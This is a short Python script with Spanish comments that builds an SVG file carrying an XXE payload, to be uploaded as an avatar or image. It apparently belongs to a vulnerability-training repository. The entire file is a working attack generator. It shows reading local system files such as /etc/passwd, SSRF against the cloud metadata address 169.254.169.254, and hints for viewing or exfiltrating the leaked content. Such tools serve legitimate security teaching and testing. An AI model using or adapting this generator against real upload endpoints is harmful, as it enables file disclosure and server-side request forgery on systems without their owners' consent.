#!/usr/bin/env python3
"""Genera un SVG con payload XXE para subir como imagen (avatar/adjunto).

Un SVG es XML: si la app procesa la imagen, resuelve la entidad y renderiza
el contenido dentro del <text>. El recurso a leer es un parametro tuyo.

Ejemplos:
    python gen_svg_xxe.py                              # file:///etc/hostname -> xxe.svg
    python gen_svg_xxe.py -r file:///etc/passwd -o passwd.svg
    python gen_svg_xxe.py -r http://169.254.169.254/  # XXE -> SSRF
    python gen_svg_xxe.py --stdout                     # imprime, no guarda

Ref: vulnerabilities/006-xxe/examples/004-xxe-por-subida-de-svg.md
"""
import argparse

TEMPLATE = (
    '<?xml version="1.0" standalone="yes"?>\n'
    '<!DOCTYPE test [ <!ENTITY {entity} SYSTEM "{resource}" > ]>\n'
    '<svg width="{w}px" height="{h}px" '
    'xmlns="http://www.w3.org/2000/svg" '
    'xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">\n'
    '  <text font-size="16" x="0" y="16">&{entity};</text>\n'
    '</svg>\n'
)


def build(resource, entity="xxe", width=128, height=128):
    """Devuelve el SVG XXE como string."""
    return TEMPLATE.format(resource=resource, entity=entity, w=width, h=height)


def main():
    p = argparse.ArgumentParser(description="Genera un SVG con payload XXE.")
    p.add_argument("-r", "--resource", default="file:///etc/hostname",
                   help="URI que lee la entidad: file:///... (lectura) o "
                        "http://... (SSRF). Default: file:///etc/hostname")
    p.add_argument("-o", "--output", default="xxe.svg",
                   help="Archivo de salida. Default: xxe.svg")
    p.add_argument("-e", "--entity", default="xxe",
                   help="Nombre de la entidad. Default: xxe")
    p.add_argument("--width", type=int, default=128)
    p.add_argument("--height", type=int, default=128)
    p.add_argument("--stdout", action="store_true",
                   help="Imprime el SVG por pantalla en vez de guardarlo.")
    args = p.parse_args()

    svg = build(args.resource, args.entity, args.width, args.height)

    if args.stdout:
        print(svg)
        return

    with open(args.output, "w", encoding="utf-8", newline="\n") as f:
        f.write(svg)
    print(f"[+] SVG XXE escrito en: {args.output}")
    print(f"[+] Lee: {args.resource}  (via &{args.entity};)")
    print("[!] Subilo como avatar/imagen y mira el render, o abri "
          "/files/avatars/<archivo> para ver el contenido.")
    print("[!] Ojo: para exfil por HTTP el recurso no debe tener saltos de "
          "linea (file:///etc/hostname si, /etc/passwd no).")


if __name__ == "__main__":
    main()
